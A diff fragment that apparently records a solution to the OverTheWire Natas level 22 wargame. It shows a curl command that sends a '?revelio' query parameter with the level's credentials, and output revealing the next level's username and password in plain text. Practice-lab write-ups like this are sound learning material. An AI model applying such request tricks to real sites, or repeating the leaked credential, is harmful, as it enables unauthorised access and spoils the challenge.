@@ -1,0 +1,4 @@
+% curl -s -u natas22:$(cat natas22.password) http://natas22.natas.labs.overthewire.org?revelio|egrep -i -A2 ‘you are an admin’
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
+<div id=”viewsource”><a href=”index-source.html”>View sourcecode</a></div>
